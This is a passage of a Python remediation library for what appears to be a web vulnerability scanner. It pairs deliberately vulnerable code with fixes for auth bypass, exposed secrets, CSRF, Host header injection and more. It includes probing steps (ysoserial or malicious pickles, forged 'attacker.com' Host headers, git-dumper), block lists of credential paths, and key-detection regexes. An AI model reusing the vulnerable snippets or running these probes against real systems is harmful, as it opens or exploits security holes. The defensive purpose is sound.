?>
''',
            },
        },
        'verify': (
            'Run ysoserial (Java) or generate a malicious pickle payload. '
            'Send as the cookie/body — the server should return 400/403, '
            'not execute commands. Also run owasp-dependency-check for known vulnerable libs.'
        ),
        'references': [
            'https://portswigger.net/web-security/deserialization',
            'https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data',
            'https://github.com/frohoff/ysoserial',
        ],
    },

    # ── 17. BROKEN AUTHENTICATION & RATE LIMITING ───────────────────────────
    'Broken Authentication': {
        'summary': (
            'Broken authentication covers weak password policies, missing rate limiting, '
            'insecure session management, and header-based auth bypasses. Attackers can '
            'brute-force credentials or bypass authentication with forged headers.'
        ),
        'impact': (
            '🔴 CRITICAL — Credential stuffing, brute-force, account takeover, '
            'admin access without legitimate credentials.'
        ),
        'steps': [
            '1. Add rate limiting (max 5 attempts / 15 minutes) on all auth endpoints.',
            '2. Use exponential backoff and temporary lockout after repeated failures.',
            '3. Reject requests with X-Forwarded-For: 127.0.0.1 used as auth bypass on admin routes.',
            '4. Implement MFA for admin and high-privilege accounts.',
            '5. Use bcrypt/argon2 for password storage (never MD5 or SHA-1).',
        ],
        'patches': {
            'Python · Flask + flask-limiter': {
                'lang': 'python',
                'before': '''\
# ❌ VULNERABLE — no rate limiting, unlimited brute-force
@app.route("/api/auth/login", methods=["POST"])
def login():
    email    = request.json.get("email")
    password = request.json.get("password")
    user     = db.verify_user(email, password)
    if not user:
        return jsonify({"error": "Invalid credentials"}), 401
    return jsonify({"token": generate_token(user)})
''',
                'after': '''\
# ✅ FIXED — rate limiting + argon2 + constant-time comparison
# pip install flask-limiter argon2-cffi
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
from argon2 import PasswordHasher
from argon2.exceptions import VerifyMismatchError
import time

limiter = Limiter(app=app, key_func=get_remote_address, default_limits=["200 per minute"])
ph = PasswordHasher()

@app.route("/api/auth/login", methods=["POST"])
@limiter.limit("5 per 15 minutes")          # ← hard rate limit per IP
def login():
    data     = request.get_json(force=True)
    email    = str(data.get("email", ""))[:254]
    password = str(data.get("password", ""))[:128]

    user = db.get_user_by_email(email)

    # Constant-time comparison even if user not found (prevents timing oracle)
    dummy_hash = "$argon2id$v=19$m=65536,t=3,p=4$..."
    stored     = user["password_hash"] if user else dummy_hash
    try:
        ph.verify(stored, password)
    except VerifyMismatchError:
        time.sleep(0.1)  # slow down automated tools
        return jsonify({"error": "Invalid credentials"}), 401

    if not user:
        return jsonify({"error": "Invalid credentials"}), 401

    return jsonify({"token": generate_token(user)})
''',
            },
            'Node.js · express-rate-limit': {
                'lang': 'javascript',
                'before': '''\
// ❌ No rate limiting
app.post("/api/login", async (req, res) => {
  const user = await verifyUser(req.body.email, req.body.password);
  if (!user) return res.status(401).json({ error: "Invalid credentials" });
  res.json({ token: issueToken(user) });
});
''',
                'after': '''\
// ✅ FIXED
// npm install express-rate-limit argon2
const rateLimit = require("express-rate-limit");
const argon2    = require("argon2");

const loginLimiter = rateLimit({
  windowMs:  15 * 60 * 1000,  // 15 minutes
  max:        5,                // 5 attempts per window per IP
  message:   { error: "Too many login attempts. Try again in 15 minutes." },
  standardHeaders: true,
  legacyHeaders:   false,
});

app.post("/api/login", loginLimiter, async (req, res) => {
  const { email = "", password = "" } = req.body;
  const user = await db.getUserByEmail(email);

  // Constant-time — run argon2.verify even if user not found
  const hash = user?.passwordHash || await argon2.hash("dummy_dummy");
  const valid = user && await argon2.verify(hash, password);

  if (!valid) return res.status(401).json({ error: "Invalid credentials" });
  res.json({ token: issueToken(user) });
});
''',
            },
            'Header-based Auth Bypass Fix · Flask': {
                'lang': 'python',
                'before': '''\
# ❌ Trusts X-Forwarded-For header for admin exemption
@app.before_request
def check_admin():
    if request.headers.get("X-Forwarded-For") == "127.0.0.1":
        return   # assume internal request = trusted ← NEVER DO THIS
''',
                'after': '''\
# ✅ Never trust X-Forwarded-For for authorization decisions.
# Use JWT role claims or a session user object instead:
@app.before_request
def check_admin():
    token = request.headers.get("Authorization", "").replace("Bearer ", "")
    try:
        payload = verify_token(token)
        if payload.get("role") != "admin":
            abort(403)
    except Exception:
        abort(401)
''',
            },
        },
        'verify': (
            'Send 6 consecutive POST /api/login requests — the 6th should return 429 Too Many Requests. '
            'Try X-Forwarded-For: 127.0.0.1 on admin routes — should get 401/403. '
            'Check password hashes in DB — should start with $argon2 not $1$ (MD5) or $2$ (bcrypt is OK too).'
        ),
        'references': [
            'https://owasp.org/www-community/attacks/Credential_stuffing',
            'https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html',
            'https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html',
        ],
    },

    # ── 18. SENSITIVE PATH EXPOSURE ─────────────────────────────────────────
    'Sensitive Path': {
        'summary': (
            'Sensitive files like .env, .git/config, backup archives, admin panels, '
            'or debug endpoints are publicly accessible via HTTP, exposing credentials, '
            'source code, and infrastructure details.'
        ),
        'impact': (
            '🔴 CRITICAL — .env → DB credentials, API keys. .git/config → full source code download. '
            'backup.sql → entire database. phpinfo.php → server config.'
        ),
        'steps': [
            '1. Block all sensitive paths at the web server level (Nginx/Apache config).',
            '2. Never commit .env files to the repo — use .gitignore.',
            '3. Move backups off the web root or behind authenticated S3/blob storage.',
            '4. Disable directory listing globally.',
            '5. Remove /phpmyadmin, /phpinfo.php, /server-status from production.',
        ],
        'patches': {
            'Nginx (block rules)': {
                'lang': 'nginx',
                'before': '''\
# ❌ No protection — any path is accessible
''',
                'after': '''\
# ✅ FIXED — nginx.conf server block
server {
    # Disable directory listing
    autoindex off;

    # Block hidden files and common sensitive paths
    location ~* /(\\.env|\\.git|\\.htaccess|\\.ssh|backup|config\\.|phpinfo|wp-config|web\\.config|settings\\.py|credentials|secrets|dump\\.sql|database\\.sql) {
        deny all;
        return 404;   # Use 404 not 403 to avoid confirming existence
    }

    # Block dangerous file extensions
    location ~* \\.(sql|bak|backup|zip|tar|gz|log|swp|old|orig)$ {
        deny all;
        return 404;
    }

    # Block debug & admin endpoints
    location ~* ^/(actuator|debug|console|telescope|horizon|/_profiler|phpmyadmin|phpMyAdmin) {
        deny all;
        return 404;
    }
}
''',
            },
            'Apache (.htaccess)': {
                'lang': 'apache',
                'before': '''\
# ❌ No protection
''',
                'after': '''\
# ✅ FIXED — .htaccess
Options -Indexes   # Disable directory listing

# Block hidden files
<FilesMatch "^\\.(env|git|htaccess|htpasswd|ssh)">
    Order allow,deny
    Deny from all
</FilesMatch>

# Block unsafe extensions
<FilesMatch "\\.(sql|bak|backup|zip|tar\\.gz|log|swp|old)$">
    Order allow,deny
    Deny from all
</FilesMatch>

# Block phpinfo and debug
<LocationMatch "^/(phpinfo\\.php|info\\.php|debug|server-status|wp-config\\.php)">
    Order allow,deny
    Deny from all
</LocationMatch>
''',
            },
            'Flask (route guard)': {
                'lang': 'python',
                'before': '''\
# ❌ No guards — static files served from web root
''',
                'after': '''\
# ✅ FIXED — explicit secure static serving
import os
from flask import send_from_directory, abort

SAFE_STATIC_DIR = os.path.realpath("/var/www/public")
BLOCKED_EXTENSIONS = {".env", ".sql", ".bak", ".git", ".log", ".zip"}

@app.route("/files/<path:filename>")
def serve_file(filename):
    # Block sensitive extensions
    _, ext = os.path.splitext(filename)
    if ext.lower() in BLOCKED_EXTENSIONS:
        abort(404)

    # Resolve and jail to public directory
    full = os.path.realpath(os.path.join(SAFE_STATIC_DIR, filename))
    if not full.startswith(SAFE_STATIC_DIR + os.sep):
        abort(404)

    return send_from_directory(SAFE_STATIC_DIR, filename)
''',
            },
            '.gitignore (prevent commit of secrets)': {
                'lang': 'bash',
                'before': '''\
# ❌ .env committed to repo — visible in git history forever
''',
                'after': '''\
# ✅ Add to .gitignore BEFORE first commit
.env
.env.*
*.local
secrets.json
credentials.json
private.pem
*.key
*.pem
config/database.yml
*_backup.sql
*.bak
*.log

# Remove already-committed .env from history:
git rm --cached .env
git commit -m "Remove tracked .env"
# Then use: git filter-branch or BFG Repo Cleaner to purge from history
''',
            },
        },
        'verify': (
            'Run: curl -s -o /dev/null -w "%{http_code}" https://example.com/.env\n'
            'Should return 404, not 200. '
            'Also run: git-dumper http://example.com/.git /tmp/dump — should fail.'
        ),
        'references': [
            'https://owasp.org/www-project-web-security-testing-guide/',
            'https://github.com/internetwache/GitTools',
        ],
    },

    # ── 19. DIRECTORY LISTING ───────────────────────────────────────────────
    'Directory Listing': {
        'summary': (
            'Directory listing is enabled on one or more paths, letting any visitor '
            'browse files as if it were a local folder, exposing config files, backups, '
            'user uploads, and source code.'
        ),
        'impact': (
            '🟠 HIGH — Attackers can identify and download sensitive files without knowing '
            'exact filenames by browsing the directory index.'
        ),
        'steps': [
            '1. Disable directory listing globally in the web server configuration.',
            '2. Ensure every directory containing files served via HTTP has an index file.',
            '3. Move file uploads to a path outside the web root or behind authentication.',
        ],
        'patches': {
            'Nginx': {
                'lang': 'nginx',
                'before': '''\
location /uploads/ { }   # ❌ autoindex defaults to off but no explicit deny
''',
                'after': '''\
# ✅ FIXED — disable globally
http {
    autoindex off;   # Global default
}

server {
    location /uploads/ {
        autoindex off;    # Explicit per-location
        # Serve only specific known-safe types:
        location ~* \\.(jpg|jpeg|png|gif|webp|svg)$ {
            add_header Cache-Control "public, max-age=86400";
        }
        location / { return 403; }   # Block everything else in uploads
    }
}
''',
            },
            'Apache': {
                'lang': 'apache',
                'before': '''\
# ❌ Indexes option not explicitly disabled
<Directory "/var/www/html/uploads">
    Options Indexes
</Directory>
''',
                'after': '''\
# ✅ FIXED — .htaccess or httpd.conf
<Directory "/var/www/html">
    Options -Indexes   # Remove Indexes from all directories
</Directory>

<Directory "/var/www/html/uploads">
    Options -Indexes
    # Only allow image types
    <FilesMatch "\\.(jpg|jpeg|png|gif|webp)$">
        Allow from all
    </FilesMatch>
    <FilesMatch ".">
        Deny from all
    </FilesMatch>
</Directory>
''',
            },
            'Python · Flask': {
                'lang': 'python',
                'before': '''\
# ❌ Flask serves entire uploads folder
app.config["UPLOAD_FOLDER"] = "uploads/"
# No restriction on what\'s served
''',
                'after': '''\
# ✅ FIXED — serve only files with whitelisted extensions + auth check
import os
from flask import send_from_directory, abort
UPLOAD_DIR = os.path.realpath("/var/www/uploads")
ALLOWED_EXT = {".jpg", ".jpeg", ".png", ".gif", ".webp", ".pdf"}

@app.route("/uploads/<path:filename>")
@auth_required   # require login to download files
def serve_upload(filename):
    ext = os.path.splitext(filename)[1].lower()
    if ext not in ALLOWED_EXT:
        abort(403)
    return send_from_directory(UPLOAD_DIR, filename)

# No route serves directory listings — Flask won\'t generate them automatically.
''',
            },
        },
        'verify': (
            'Visit https://example.com/uploads/ in a browser. '
            'Should get 403 Forbidden or redirect to index.html, '
            'never an "Index of /uploads/" listing.'
        ),
        'references': [
            'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission',
        ],
    },

    # ── 20. SENSITIVE DATA LEAKAGE ──────────────────────────────────────────
    'Sensitive Data Leakage': {
        'summary': (
            'API keys, database credentials, JWT tokens, and PII appear in HTTP '
            'responses, JavaScript files, or error messages — accessible to anyone '
            'who views the page source or intercepts traffic.'
        ),
        'impact': (
            '🔴 CRITICAL — Exposed AWS keys allow full cloud account takeover. '
            'Exposed DB credentials enable direct database compromise. '
            'Exposed credit card numbers or SSNs expose massive regulatory liability (PCI-DSS / GDPR).'
        ),
        'steps': [
            '1. Rotate any exposed credentials IMMEDIATELY — assume they are compromised.',
            '2. Move all secrets to environment variables or a secrets manager (AWS Secrets Manager, HashiCorp Vault).',
            '3. Add truffleHog / gitleaks to your CI pipeline to catch secrets before commit.',
            '4. Never log sensitive fields (passwords, tokens, card numbers) — use structured logging with PII masking.',
            '5. Implement response filtering middleware to strip secrets before API responses are sent.',
        ],
        'patches': {
            'Python · Rotate and use env vars': {
                'lang': 'python',
                'before': '''\
# ❌ CRITICAL — hardcoded credentials in source code
DATABASE_URL = "postgresql://admin:SuperSecret123@prod-db.internal:5432/app"
AWS_KEY      = "AKIAIOSFODNN7EXAMPLE"
AWS_SECRET   = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
STRIPE_KEY   = "sk_live_abcdef123456789"
''',
                'after': '''\
# ✅ FIXED — environment variables + python-decouple
# pip install python-decouple
from decouple import config

DATABASE_URL = config("DATABASE_URL")    # reads from .env or OS env
AWS_KEY      = config("AWS_ACCESS_KEY_ID")
AWS_SECRET   = config("AWS_SECRET_ACCESS_KEY")
STRIPE_KEY   = config("STRIPE_SECRET_KEY")

# .env file (NOT committed to git):
# DATABASE_URL=postgresql://admin:SuperSecret123@prod-db.internal:5432/app
# AWS_ACCESS_KEY_ID=AKIA...
# STRIPE_SECRET_KEY=sk_live_...
''',
            },
            'Node.js · dotenv + Vault': {
                'lang': 'javascript',
                'before': '''\
// ❌ Secrets in config file checked into Git
module.exports = {
  dbPassword: "SuperSecret123",
  stripeKey:  "sk_live_abcdef123456789"
};
''',
                'after': '''\
// ✅ FIXED — dotenv for dev, proper secrets manager for production
// npm install dotenv @aws-sdk/client-secrets-manager
require("dotenv").config();   // loads .env in development

// Production: fetch from AWS Secrets Manager at startup
const { SecretsManagerClient, GetSecretValueCommand } = require("@aws-sdk/client-secrets-manager");
async function loadSecrets() {
  const client = new SecretsManagerClient({ region: "us-east-1" });
  const cmd    = new GetSecretValueCommand({ SecretId: "prod/myapp" });
  const resp   = await client.send(cmd);
  const s      = JSON.parse(resp.SecretString);
  process.env.DB_PASSWORD  = s.db_password;
  process.env.STRIPE_KEY   = s.stripe_key;
}
''',
            },
            'Logging PII masking · Python': {
                'lang': 'python',
                'before': '''\
# ❌ Writing sensitive data to logs
logger.info(f"Login attempt: email={email}, password={password}")
logger.info(f"Charge user card: number={card_number}")
''',
                'after': '''\
# ✅ FIXED — PII masking filter + structured logging
import logging, re

class PIIFilter(logging.Filter):
    MASKS = [
        (re.compile(r"password=[^&\\s,]+"), "password=***"),
        (re.compile(r"\\b\\d{16}\\b"),          "****-****-****-****"),  # credit card
        (re.compile(r"AKIA[0-9A-Z]{16}"),    "AWS_KEY_REDACTED"),
        (re.compile(r"sk_live_\\S+"),          "STRIPE_KEY_REDACTED"),
    ]
    def filter(self, record):
        msg = record.getMessage()
        for pattern, mask in self.MASKS:
            msg = pattern.sub(mask, msg)
        record.msg  = msg
        record.args = ()   # clear args to prevent re-formatting
        return True

logging.getLogger().addFilter(PIIFilter())
logger.info(f"Login attempt: email={email}, password={password}")
# → "Login attempt: email=user@example.com, password=***"
''',
            },
            'CI/CD · gitleaks pre-commit': {
                'lang': 'bash',
                'before': '''\
# ❌ No secret scanning in CI — secrets land in git history
''',
                'after': '''\
# ✅ Install gitleaks as a pre-commit hook
# brew install gitleaks   OR   apt install gitleaks

# .pre-commit-config.yaml:
repos:
  - repo: https://github.com/gitleaks/gitleaks
    rev: v8.18.0
    hooks:
      - id: gitleaks

# Run manually:
# gitleaks detect --source . --verbose

# Add to GitHub Actions workflow:
# - uses: gitleaks/gitleaks-action@v2
#   env:
#     GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
''',
            },
        },
        'verify': (
            'Run: gitleaks detect --source . — should report 0 findings. '
            'Check all API responses in Burp for patterns like AKIA, sk_live_, -----BEGIN. '
            'Rotate any key that shows up in the scanner findings IMMEDIATELY.'
        ),
        'references': [
            'https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html',
            'https://github.com/gitleaks/gitleaks',
            'https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure',
        ],
    },

    # ── 21. SSL / TLS ───────────────────────────────────────────────────────
    'SSL': {
        'summary': (
            'Weak TLS configuration (supporting TLS 1.0/1.1, weak ciphers, expired certs, '
            'or missing HSTS) allows network attackers to decrypt traffic or perform '
            'protocol downgrade attacks.'
        ),
        'impact': (
            '🟠 HIGH — MITM attack allowing credential interception, session hijacking, '
            'and data exfiltration in plaintext.'
        ),
        'steps': [
            '1. Disable TLS 1.0 and 1.1 — only support TLS 1.2 and 1.3.',
            '2. Use only forward-secret cipher suites (ECDHE).',
            '3. Enable HSTS with a long max-age and preload.',
            '4. Automate certificate renewal with Let\'s Encrypt / certbot.',
            '5. Test configuration at https://www.ssllabs.com/ssltest/ — target A+ rating.',
        ],
        'patches': {
            'Nginx · TLS hardening': {
                'lang': 'nginx',
                'before': '''\
# ❌ Weak — supports TLS 1.0 and 1.1
ssl_protocols SSLv3 TLSv1 TLSv1.1 TLSv1.2;
ssl_ciphers HIGH:!aNULL:!MD5;
''',
                'after': '''\
# ✅ FIXED — Mozilla Intermediate config (SSLLabs A+)
ssl_protocols TLSv1.2 TLSv1.3;
ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305;
ssl_prefer_server_ciphers off;         # TLS 1.3 handles this
ssl_session_timeout 1d;
ssl_session_cache   shared:SSL:10m;
ssl_session_tickets off;               # prevents session resumption fingerprinting
ssl_stapling        on;
ssl_stapling_verify on;
resolver 1.1.1.1 8.8.8.8 valid=300s;  # OCSP resolver
add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload" always;
''',
            },
            'Apache · TLS hardening': {
                'lang': 'apache',
                'before': '''\
# ❌ Weak — old protocols and ciphers
SSLProtocol all -SSLv3
SSLCipherSuite HIGH:MEDIUM:!MD5:!RC4:!3DES
''',
                'after': '''\
# ✅ FIXED
SSLProtocol             -all +TLSv1.2 +TLSv1.3
SSLCipherSuite          ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384
SSLHonorCipherOrder     off
SSLSessionTickets       off
Header always set Strict-Transport-Security "max-age=63072000; includeSubDomains; preload"
''',
            },
            'Let\'s Encrypt cert auto-renewal': {
                'lang': 'bash',
                'before': '''\
# ❌ Manual renewal — certificate expires and site breaks
''',
                'after': '''\
# ✅ FIXED — certbot auto-renewal (Ubuntu/Debian)
# Install
sudo apt install certbot python3-certbot-nginx

# Obtain + configure cert
sudo certbot --nginx -d yourdomain.com -d www.yourdomain.com

# Verify auto-renewal is enabled (certbot installs a systemd timer)
sudo systemctl status certbot.timer

# Manual test renewal
sudo certbot renew --dry-run
''',
            },
        },
        'verify': (
            'Run: testssl.sh https://example.com — should show TLS 1.3 and no vulnerable protocols. '
            'Visit: https://www.ssllabs.com/ssltest/ — target A+ rating. '
            'Check HSTS header: curl -I https://example.com | grep -i strict'
        ),
        'references': [
            'https://ssl-config.mozilla.org/',
            'https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Security_Cheat_Sheet.html',
            'https://testssl.sh',
            'https://www.ssllabs.com/ssltest/',
        ],
    },

    # ── 22. CSRF ────────────────────────────────────────────────────────────
    'CSRF': {
        'summary': (
            'Cross-Site Request Forgery tricks authenticated users into submitting '
            'state-changing requests (fund transfers, password changes, account deletion) '
            'from attacker-controlled pages, using the victim\'s browser cookies.'
        ),
        'impact': (
            '🟠 HIGH — Unauthorized actions performed as the victim: delete account, '
            'change email/password, transfer funds, add admin users.'
        ),
        'steps': [
            '1. Use CSRF tokens on all state-changing forms (POST, PUT, DELETE).',
            '2. Set SameSite=Strict on session cookies (prevents cross-site cookie sending).',
            '3. Verify the Origin/Referer header server-side for sensitive operations.',
            '4. Use custom request headers (X-Requested-With) for AJAX — browsers block cross-origin custom headers.',
        ],
        'patches': {
            'Python · Flask-WTF': {
                'lang': 'python',
                'before': '''\
# ❌ No CSRF protection — all POST forms are vulnerable
@app.route("/transfer", methods=["POST"])
def transfer():
    amount = request.form["amount"]
    to     = request.form["to"]
    do_transfer(amount, to)
    return "Done"
''',
                'after': '''\
# ✅ FIXED — Flask-WTF CSRF token
# pip install flask-wtf
from flask_wtf.csrf import CSRFProtect, validate_csrf
from flask_wtf import FlaskForm
from wtforms import StringField, FloatField

app.config["SECRET_KEY"]    = os.environ["SECRET_KEY"]
app.config["WTF_CSRF_TIME_LIMIT"] = 3600   # token expires in 1 hour
csrf = CSRFProtect(app)      # automatically protects ALL POST routes

class TransferForm(FlaskForm):
    amount = FloatField("Amount")
    to     = StringField("Recipient")

@app.route("/transfer", methods=["GET", "POST"])
def transfer():
    form = TransferForm()
    if form.validate_on_submit():    # validates CSRF token automatically
        do_transfer(form.amount.data, form.to.data)
        return redirect("/success")
    return render_template("transfer.html", form=form)

# transfer.html:
# <form method="POST">
#   {{ form.hidden_tag() }}   ← injects the CSRF token input
#   ...
# </form>
''',
            },
            'Django (built-in CSRF)': {
                'lang': 'python',
                'before': '''\
# ❌ CSRF middleware removed or bypassed
MIDDLEWARE = [
    # "django.middleware.csrf.CsrfViewMiddleware",  ← commented out!
]
# Or using @csrf_exempt incorrectly
@csrf_exempt
def transfer(request): ...
''',
                'after': '''\
# ✅ FIXED — Re-enable middleware, use csrf_protect decorator
MIDDLEWARE = [
    "django.middleware.security.SecurityMiddleware",
    "django.middleware.csrf.CsrfViewMiddleware",  # NEVER remove
    # ...
]

# In views, never use @csrf_exempt on sensitive routes
# Templates automatically get the token via {% csrf_token %}:
# <form method="POST">{% csrf_token %} ... </form>
''',
            },
            'Node.js · csurf + SameSite cookie': {
                'lang': 'javascript',
                'before': '''\
// ❌ No CSRF, SameSite not set
app.post("/transfer", (req, res) => { doTransfer(...); });
''',
                'after': '''\
// ✅ FIXED — CSRF token + SameSite cookie
// npm install csurf
const csrf = require("csurf");
const csrfProtection = csrf({ cookie: { sameSite: "strict", httpOnly: true } });

// Serve form with CSRF token
app.get("/transfer", csrfProtection, (req, res) => {
  res.render("transfer", { csrfToken: req.csrfToken() });
});
// transfer.ejs: <input type="hidden" name="_csrf" value="<%= csrfToken %>">

// Process — token is validated automatically, throws ForbiddenError if invalid
app.post("/transfer", csrfProtection, (req, res) => {
  doTransfer(req.body.amount, req.body.to);
  res.redirect("/success");
});

// Error handler for CSRF failures
app.use((err, req, res, next) => {
  if (err.code === "EBADCSRFTOKEN")
    return res.status(403).json({ error: "CSRF token invalid" });
  next(err);
});
''',
            },
        },
        'verify': (
            'Open the transfer form. Use DevTools to copy the form request. '
            'Submit it from a different origin (different tab with fetch()) — should get 403. '
            'Also try replaying the same CSRF token twice — token should only be valid once.'
        ),
        'references': [
            'https://owasp.org/www-community/attacks/csrf',
            'https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html',
        ],
    },

    # ── 23. HOST HEADER INJECTION ───────────────────────────────────────────
    'Host Header Injection': {
        'summary': (
            'Applications that use the HTTP Host header to construct URLs (password reset '
            'links, email links) can be tricked by attackers who send forged Host headers, '
            'causing the server to generate links pointing to attacker-controlled domains.'
        ),
        'impact': (
            '🟠 HIGH — Password reset link poisoning (victim clicks a link that sends their '
            'reset token to the attacker\'s server), cache poisoning, routing bypass.'
        ),
        'steps': [
            '1. Use a hardcoded BASE_URL from an environment variable — never request.host.',
            '2. Validate the Host header against an allowlist and reject unknown hosts.',
            '3. Configure Nginx to drop connections with unknown Host headers.',
        ],
        'patches': {
            'Python · Flask': {
                'lang': 'python',
                'before': '''\
# ❌ VULNERABLE — uses Host header in password reset link
@app.route("/forgot-password", methods=["POST"])
def forgot_password():
    email = request.json.get("email")
    token = generate_reset_token(email)
    link  = f"https://{request.host}/reset?token={token}"   # ← poisonable!
    send_email(email, link)
    return jsonify({"message": "Email sent"})
''',
                'after': '''\
# ✅ FIXED — hardcoded base URL + host allowlist
import os
from flask import request, abort

BASE_URL      = os.environ["BASE_URL"]  # e.g. https://app.mysite.com
ALLOWED_HOSTS = {"app.mysite.com", "www.mysite.com"}

@app.before_request
def validate_host():
    host = request.host.split(":")[0]   # strip port
    if host not in ALLOWED_HOSTS:
        abort(400, f"Invalid Host header: {host}")

@app.route("/forgot-password", methods=["POST"])
def forgot_password():
    email = request.json.get("email", "")
    token = generate_reset_token(email)
    link  = f"{BASE_URL}/reset?token={token}"   # ← from env, not from headers
    send_email(email, link)
    return jsonify({"message": "Email sent"})
''',
            },
            'Nginx (catch-all + allowlist)': {
                'lang': 'nginx',
                'before': '''\
# ❌ No host validation — any Host header is accepted
server {
    listen 80;
    # ...
}
''',
                'after': '''\
# ✅ FIXED — catch-all rejects unknown hosts
server {
    listen 80 default_server;
    server_name _;         # catch-all for unknown hosts
    return 444;            # drop connection silently (no response)
}

server {
    listen 80;
    server_name mysite.com www.mysite.com app.mysite.com;
    # ... valid config
    return 301 https://$host$request_uri;
}

server {
    listen 443 ssl http2;
    server_name mysite.com www.mysite.com app.mysite.com;
    # ... SSL config
}
''',
            },
        },
        'verify': (
            'curl -H "Host: attacker.com" -X POST https://example.com/forgot-password \\\n'
            '-d \'{"email":"victim@example.com"}\'\n'
            'The reset email should contain BASE_URL (example.com), NOT attacker.com.'
        ),
        'references': [
            'https://portswigger.net/web-security/host-header',
            'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/17-Testing_for_Host_Header_Injection',
        ],
    },

    # ── 24. INFORMATION DISCLOSURE ──────────────────────────────────────────
    'Information Disclosure': {
        'summary': (
            'The application leaks internal information through verbose error messages, '
            'stack traces, server headers, or debug endpoints, giving attackers a '
            'detailed map of the internal architecture.'
        ),
        'impact': (
            '🟡 MEDIUM — Reveals framework versions (enabling targeted exploits), '
            'file paths, SQL queries, and credentials in debug output.'
        ),
        'steps': [
            '1. Disable debug mode in production (Flask debug=False, NODE_ENV=production).',
            '2. Return generic error messages to clients; log full details internally only.',
            '3. Remove server version from headers (server_tokens off, ServerSignature Off).',
            '4. Disable or restrict access to /actuator, /phpinfo.php, /server-status.',
        ],
        'patches': {
            'Python · Flask': {
                'lang': 'python',
                'before': '''\
# ❌ Debug mode in production exposes full stack traces
app.run(debug=True, host="0.0.0.0")
# Error response reveals: File path, code line, local variables, framework version
''',
                'after': '''\
# ✅ FIXED — disable debug, custom error handlers, no info leakage
import logging, os

app.config["PROPAGATE_EXCEPTIONS"] = False

@app.errorhandler(Exception)
def handle_exception(e):
    # Log full details internally
    app.logger.exception(f"Unhandled error: {e}")
    # Return ONLY a generic message to the client
    return {"error": "An unexpected error occurred. Our team has been notified."}, 500

@app.errorhandler(404)
def not_found(e):
    return {"error": "Not found"}, 404

@app.errorhandler(403)
def forbidden(e):
    return {"error": "Forbidden"}, 403

# In production, run with:
# gunicorn -w 4 -b 127.0.0.1:5000 app:app
# (gunicorn sets debug=False by default)
''',
            },
            'Node.js · Express': {
                'lang': 'javascript',
                'before': '''\
// ❌ Default Express error handler sends stack trace
// NODE_ENV not set → Express may expose development details
''',
                'after': '''\
// ✅ FIXED — production error handler
process.env.NODE_ENV = "production";  // or set in Dockerfile/env

app.use((err, req, res, next) => {
  // Log full error server-side only
  console.error({ timestamp: new Date(), path: req.path, error: err });

  // Generic response to client
  const status = err.status || err.statusCode || 500;
  res.status(status).json({
    error: status < 500 ? err.message : "An internal error occurred."
  });
});

// Hide Express fingerprint
app.disable("x-powered-by");
''',
            },
            'Spring Boot · disable actuator in prod': {
                'lang': 'java',
                'before': '''\
# ❌ All actuator endpoints exposed
management.endpoints.web.exposure.include=*
''',
                'after': '''\
# ✅ FIXED — application.properties
# Only expose health check (for load balancer)
management.endpoints.web.exposure.include=health
management.endpoint.health.show-details=never

# Or secure with credentials:
# management.security.enabled=true
# spring.security.user.name=actuator-admin
# spring.security.user.password=${ACTUATOR_PASSWORD}
''',
            },
        },
        'verify': (
            'Visit a non-existent URL: /api/doesnotexist — should return {"error": "Not found"}, '
            'not a stack trace or framework-specific error page. '
            'Check curl -I https://example.com — Server header should not include version numbers.'
        ),
        'references': [
            'https://portswigger.net/web-security/information-disclosure',
            'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/',
        ],
    },
}


# ═══════════════════════════════════════════════════════════════════════════
#  MATCH MAP — Maps vulnerability type strings → PATCH_LIBRARY keys
# ═══════════════════════════════════════════════════════════════════════════
MATCH_MAP: Dict[str, str] = {
    # SQL Injection
    'sql injection':          'SQL Injection',
    'sql':                    'SQL Injection',
    'sqli':                   'SQL Injection',
    'critical sql':           'SQL Injection',
    'union select':           'SQL Injection',
    'blind sql':              'Blind SQL Injection',
    'time-based':             'Blind SQL Injection',
    'time based':             'Blind SQL Injection',
    # XSS
    'xss':                    'Cross-Site Scripting',
    'cross-site scripting':   'Cross-Site Scripting',
    'reflected xss':          'Cross-Site Scripting',
    'reflected cross':        'Cross-Site Scripting',
    'dom xss':                'Cross-Site Scripting',
    'dom-based xss':          'Cross-Site Scripting',
    'stored xss':             'Cross-Site Scripting',
    # Command Injection
    'command injection':      'Command Injection',
    'remote code execution':  'Command Injection',
    'rce':                    'Command Injection',
    'cmdi':                   'Command Injection',
    'os command':             'Command Injection',
    # LFI
    'lfi':                    'Local File Inclusion',
    'local file':             'Local File Inclusion',
    'path traversal':         'Local File Inclusion',
    'directory traversal':    'Local File Inclusion',
    'file inclusion':         'Local File Inclusion',
    'php source':             'Local File Inclusion',
    # SSRF
    'ssrf':                   'SSRF',
    'server-side request':    'SSRF',
    'server side request':    'SSRF',
    'blind ssrf':             'SSRF',
    # SSTI
    'ssti':                   'SSTI',
    'template injection':     'SSTI',
    'server-side template':   'SSTI',
    # XXE
    'xxe':                    'XXE',
    'xml external':           'XXE',
    'external entity':        'XXE',
    # NoSQL
    'nosql':                  'NoSQL Injection',
    'nosqli':                 'NoSQL Injection',
